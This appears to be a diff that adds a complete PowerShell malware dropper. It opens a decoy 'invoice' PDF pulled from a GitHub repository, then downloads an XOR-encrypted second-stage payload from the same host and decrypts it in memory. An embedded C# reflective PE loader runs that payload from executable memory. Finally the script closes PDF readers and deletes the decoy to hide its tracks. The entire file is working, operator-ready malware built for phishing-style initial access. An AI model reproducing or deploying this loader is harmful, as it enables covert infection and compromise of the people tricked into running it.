@@ -1,0 +1,110 @@
+# 1. Configuration
+$decoyPdfUrl = "https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/Invoice for Load ID 80814532.pdf"
+$payloadXorUrl = "https://github.com/lucid251/HGJFJTKH24/raw/refs/heads/main/stage.xor"
+$xorKey = [System.Text.Encoding]::ASCII.GetBytes('i0xuFnZOf69X7bktf3Vs') # <-- IMPORTANT: Match this to your C payload's key
+
+# Temp path for the decoy PDF
+$tempPdfPath = Join-Path $env:TEMP "dtecfG.pdf"
+
+# 2. Decoy Operation: Download and open the PDF
+try {
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($decoyPdfUrl, $tempPdfPath)
+    Start-Process $tempPdfPath
+    Write-Host "[+] Decoy PDF launched."
+} catch {
+    Write-Host "[-] Failed to download or launch decoy PDF."
+}
+
+# 3. Payload Operation: Download and Decrypt
+try {
+    $encryptedBytes = $webClient.DownloadData($payloadXorUrl)
+    
+    # Perform the XOR decryption in memory
+    $decryptedPEBytes = for($i=0; $i -lt $encryptedBytes.Length; $i++) {
+        $encryptedBytes[$i] -bxor $xorKey[$i % $xorKey.Length]
+    }
+    Write-Host "[+] Payload downloaded and decrypted in memory."
+} catch {
+    Write-Host "[-] Failed to download or decrypt payload. Exiting."
+    exit
+}
+
+
+# 4. Reflective PE Loader: C# code to execute a PE from a byte array
+$csharpPELoader = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class PEExecutor {
+    // Win32 API function imports
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
+
+    [DllImport("kernel32.dll")]
+    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+    private static UInt32 MEM_COMMIT = 0x1000;
+    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+    public static void Execute(byte[] peBytes) {
+        // Get PE headers
+        int e_lfanew = BitConverter.ToInt32(peBytes, 0x3C);
+        int sizeOfImage = BitConverter.ToInt32(peBytes, e_lfanew + 0x50);
+        int sizeOfHeaders = BitConverter.ToInt32(peBytes, e_lfanew + 0x54);
+
+        // Allocate memory for the PE image
+        IntPtr baseAddress = VirtualAlloc(IntPtr.Zero, (uint)sizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+        // Copy PE headers to the allocated memory
+        Marshal.Copy(peBytes, 0, baseAddress, sizeOfHeaders);
+
+        // Copy PE sections to the allocated memory
+        int numberOfSections = BitConverter.ToInt16(peBytes, e_lfanew + 0x06);
+        int sizeOfOptionalHeader = BitConverter.ToInt16(peBytes, e_lfanew + 0x14);
+        int sectionOffset = e_lfanew + 0x18 + sizeOfOptionalHeader;
+
+        for (int i = 0; i < numberOfSections; i++) {
+            int virtualAddress = BitConverter.ToInt32(peBytes, sectionOffset + 0x0C);
+            int sizeOfRawData = BitConverter.ToInt32(peBytes, sectionOffset + 0x10);
+            int pointerToRawData = BitConverter.ToInt32(peBytes, sectionOffset + 0x14);
+            Marshal.Copy(peBytes, pointerToRawData, (IntPtr)(baseAddress.ToInt64() + virtualAddress), sizeOfRawData);
+            sectionOffset += 0x28; // Size of IMAGE_SECTION_HEADER
+        }
+
+        // Get address of entry point
+        int addressOfEntryPoint = BitConverter.ToInt32(peBytes, e_lfanew + 0x28);
+        IntPtr entryPointAddress = (IntPtr)(baseAddress.ToInt64() + addressOfEntryPoint);
+
+        // Create a thread to execute the PE
+        uint threadId;
+        IntPtr hThread = CreateThread(IntPtr.Zero, 0, entryPointAddress, IntPtr.Zero, 0, out threadId);
+        
+        // Optionally wait for the thread to finish
+        // WaitForSingleObject(hThread, 0xFFFFFFFF); // INFINITE
+    }
+}
+"@
+
+# 5. Compile and Run the Loader
+try {
+    Add-Type -TypeDefinition $csharpPELoader
+    Write-Host "[+] In-memory PE loader compiled."
+    Write-Host "[*] Executing C payload from memory..."
+    [PEExecutor]::Execute($decryptedPEBytes)
+    Write-Host "[+] Payload execution thread created."
+} catch {
+    Write-Host "[-] Failed to compile or execute the PE loader."
+    Write-Host $_
+}
+
+# 6. Clean up the decoy PDF
+try {
+    # Give the user a moment before the PDF disappears
+    Start-Sleep -s 10
+    Stop-Process -Name "AcroRd32", "msedge" -ErrorAction SilentlyContinue # Add other PDF readers if needed
+    Remove-Item $tempPdfPath -Force -ErrorAction SilentlyContinue
+} catch {}
